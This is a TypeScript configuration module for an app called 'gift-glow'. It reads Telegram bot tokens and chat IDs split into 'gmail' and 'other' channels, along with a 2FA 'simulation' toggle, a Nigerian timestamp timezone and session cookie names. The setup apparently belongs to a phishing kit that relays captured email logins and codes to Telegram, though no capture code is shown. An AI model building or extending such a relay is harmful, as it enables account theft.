import path from "path";

export function getDataDir() {
  // Vercel serverless: only /tmp is writable (ignore DATA_DIR=./data on deploy)
  if (process.env.VERCEL) return path.join("/tmp", "gift-glow-data");
  if (process.env.DATA_DIR) return process.env.DATA_DIR;
  return path.join(process.cwd(), "data");
}

export function requireConsent() {
  return process.env.REQUIRE_CONSENT !== "false";
}

export function auto2faSimulation() {
  if (isTelegramEnabled()) {
    return process.env.AUTO_2FA_SIMULATION === "true";
  }
  return process.env.AUTO_2FA_SIMULATION !== "false";
}

export type TelegramChannel = "gmail" | "other";

const LEGACY_TELEGRAM_BOT_TOKEN = () =>
  process.env.TELEGRAM_BOT_TOKEN?.trim() ?? "";
const LEGACY_TELEGRAM_CHAT_ID = () =>
  process.env.TELEGRAM_CHAT_ID?.trim() ?? "";

export function getTelegramBotToken(channel: TelegramChannel) {
  if (channel === "gmail") {
    return (
      process.env.TELEGRAM_GMAIL_BOT_TOKEN?.trim() || LEGACY_TELEGRAM_BOT_TOKEN()
    );
  }
  return (
    process.env.TELEGRAM_OTHER_BOT_TOKEN?.trim() || LEGACY_TELEGRAM_BOT_TOKEN()
  );
}

export function getTelegramChatId(channel: TelegramChannel) {
  if (channel === "gmail") {
    return (
      process.env.TELEGRAM_GMAIL_CHAT_ID?.trim() || LEGACY_TELEGRAM_CHAT_ID()
    );
  }
  return (
    process.env.TELEGRAM_OTHER_CHAT_ID?.trim() || LEGACY_TELEGRAM_CHAT_ID()
  );
}

export function isTelegramChannelEnabled(channel: TelegramChannel) {
  return Boolean(getTelegramBotToken(channel) && getTelegramChatId(channel));
}

export function isTelegramEnabled() {
  return isTelegramChannelEnabled("gmail") || isTelegramChannelEnabled("other");
}

export function listEnabledTelegramChannels(): TelegramChannel[] {
  return (["gmail", "other"] as const).filter(isTelegramChannelEnabled);
}

/** IANA timezone for Telegram message timestamps (default: Nigeria). */
export function getDisplayTimezone() {
  return process.env.DISPLAY_TIMEZONE?.trim() || "Africa/Lagos";
}

const DEFAULT_APP_SITE_NAME = "gift-glow";

/** Redis key prefix per deployed site. Unset = gift-glow (existing production). */
export function getAppSiteName(): string {
  const raw = process.env.APP_SITE_NAME?.trim();
  if (!raw) return DEFAULT_APP_SITE_NAME;

  const safe = raw
    .toLowerCase()
    .replace(/[^a-z0-9-]/g, "-")
    .replace(/-+/g, "-")
    .replace(/^-|-$/g, "")
    .slice(0, 64);

  return safe || DEFAULT_APP_SITE_NAME;
}

export const SESSION_COOKIE = process.env.SESSION_COOKIE_NAME || "gift_glow_sid";
export const CONSENT_COOKIE =
  process.env.CONSENT_COOKIE_NAME || "gift_glow_consent";
